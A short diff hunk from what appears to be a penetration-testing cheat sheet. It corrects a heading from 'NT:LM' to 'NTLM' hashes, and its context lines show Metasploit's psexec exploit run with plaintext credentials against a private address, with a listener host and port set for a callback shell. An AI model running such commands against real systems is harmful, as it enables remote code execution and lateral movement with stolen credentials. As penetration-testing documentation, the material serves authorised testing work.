@@ -294,7 +294,7 @@ use exploit/windows/smb/psexec
 run smb://user:pass8@192.168.123.13 lhost=192.168.123.1 lport=5000
 ```
 
-Running psexec with NT:LM hashes:
+Running psexec with NTLM hashes:
 
 ```
 use exploit/windows/smb/psexec
